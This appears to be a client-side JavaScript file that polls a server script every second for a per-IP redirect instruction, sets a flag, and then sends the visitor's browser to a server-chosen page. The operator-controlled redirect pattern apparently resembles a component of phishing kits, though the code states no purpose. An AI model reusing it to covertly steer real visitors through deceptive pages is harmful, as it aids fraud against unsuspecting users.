function checkRedirect() {
    console.debug("[checkRedirect] Starting function");
    fetch('../redirect/check.php?check=1')
        .then(response => {
            console.debug("[checkRedirect] Received response:", response);
            return response.text();
        })
        .then(data => {
            console.debug("[checkRedirect] Data received:", data);

            if (data.trim() !== '') {
                const [ip, targetPage, redirectFlag] = data.trim().split(/\s*-\s*/);
                console.debug("[checkRedirect] Parsed values:", { ip, targetPage, redirectFlag });

                if (redirectFlag === '0' && targetPage) {
                    console.debug("[checkRedirect] Condition met for redirect. Target:", targetPage);

                    fetch(`../redirect/redirect.php?ip=${encodeURIComponent(ip)}&flag=1`)
                        .then(res => {
                            console.debug("[checkRedirect] Flag update request sent:", res);
                            return res.text();
                        })
                        .then(updateResp => {
                            console.debug("[checkRedirect] Flag update response:", updateResp);
                            window.location.href = targetPage;
                        })
                        .catch(err => {
                            console.debug("[checkRedirect] Error updating flag:", err);
                            window.location.href = targetPage;
                        });

                    return;
                }
            } else {
                console.debug("[checkRedirect] No redirect data found.");
            }

            setTimeout(checkRedirect, 1000);
        })
        .catch(error => {
            console.debug("[checkRedirect] Fetch error:", error);
            setTimeout(checkRedirect, 1000);
        });
}

window.onload = checkRedirect;
